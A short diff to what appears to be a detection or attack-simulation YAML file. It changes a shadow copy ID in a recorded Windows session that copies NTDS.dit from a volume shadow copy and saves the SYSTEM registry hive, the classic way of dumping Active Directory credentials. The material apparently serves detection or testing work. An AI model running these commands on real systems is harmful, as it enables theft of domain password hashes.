@@ -39,7 +39,7 @@ simulation:
     (C) Copyright 2001-2013 Microsoft Corp.
 
     Successfully created shadow copy for 'C:\'
-        Shadow Copy ID: {6cc3699a-968b-4e45-b949-00b3426b86ed}
+        Shadow Copy ID: {d618e983-b877-459a-a042-d063c1627326}
         Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2
 
     C:\Users\Administrator>copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit C:\Windows\Temp\ntds.dit
@@ -50,7 +50,6 @@ simulation:
 
     C:\Users\Administrator>reg save HKLM\SYSTEM C:\Windows\Temp\SYSTEM_HIVE
     The operation completed successfully.
-
 
     C:\Users\Administrator>
 references:
